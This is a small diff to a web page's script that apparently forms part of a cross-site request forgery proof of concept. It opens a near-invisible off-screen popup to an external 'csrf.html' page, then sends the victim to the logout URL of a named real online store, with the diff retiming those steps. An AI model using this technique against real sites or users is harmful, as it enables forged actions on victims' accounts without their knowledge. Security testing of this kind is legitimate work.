@@ -6,11 +6,12 @@
 
       function windowOpen() {
       	newWindow = window.open("https://strendey.github.io/csrf.html", "_blank", "toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=1000, top=1000, width=10, height=10, visible=none");
-
+	setTimeout(() => {
+		window.location.href="https://loja.mush.com.br/account/logout";
+      	}, 300);
       	setTimeout(() => {
       		newWindow.close();
-		window.location.href="https://loja.mush.com.br/account/logout";
-      	}, 100);
+      	}, 750);
       }
     </script>
   </head>
